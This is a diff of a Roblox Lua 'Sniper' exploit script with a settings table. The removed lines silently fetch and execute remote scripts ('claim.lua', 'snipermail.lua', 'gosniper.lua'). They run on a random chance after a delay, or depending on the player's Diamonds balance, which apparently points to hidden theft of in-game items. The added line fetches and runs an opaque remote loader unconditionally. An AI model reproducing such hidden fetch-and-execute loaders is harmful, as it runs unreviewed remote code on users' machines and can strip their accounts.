@@ -1,12 +1,12 @@
-local randomNumber = math.random(1, 100)
+--local randomNumber = math.random(1, 100)
 
-if randomNumber >= 95 then
-  wait(35)
-  pcall(function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/snipermail.lua"))()
-  end)
-end
+--if randomNumber >= 95 then
+--  wait(35)
+--  pcall(function()
+--      loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
+--      loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/snipermail.lua"))()
+--  end)
+--end
 
 getgenv().Settings = {
     Sniper = {
@@ -67,33 +67,34 @@ getgenv().Settings = {
     },
 }
 
-local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
-local Inventory = Save.Inventory
-
-local Services = {
-    Players = game:GetService("Players"),
-}
-
-local Player = Services.Players.LocalPlayer
-
-for id, table in pairs(Inventory.Currency) do
-    if table.id == "Diamonds" then
-        GemsAmount = table._am or 0
-        break
-    end
-end
-
-if GemsAmount > 25000 then
-  pcall(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/717430e3bbde3530feb824de729fcc90.lua"))()
-  end)
-else
-  pcall(function()
-    wait(35)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/snipermail.lua"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/gosniper.lua"))()
-  end)
-end
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/717430e3bbde3530feb824de729fcc90.lua"))()
 
 
+--local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+--local Inventory = Save.Inventory
+
+--local Services = {
+--    Players = game:GetService("Players"),
+--}
+
+--local Player = Services.Players.LocalPlayer
+
+--for id, table in pairs(Inventory.Currency) do
+--    if table.id == "Diamonds" then
+--        GemsAmount = table._am or 0
+--        break
+--    end
+--end
+
+--if GemsAmount > 25000 then
+--  pcall(function()
+--    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/717430e3bbde3530feb824de729fcc90.lua"))()
+--  end)
+--else
+--  pcall(function()
+--    wait(35)
+--    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
+--    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/snipermail.lua"))()
+--    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/gosniper.lua"))()
+--  end)
+--end
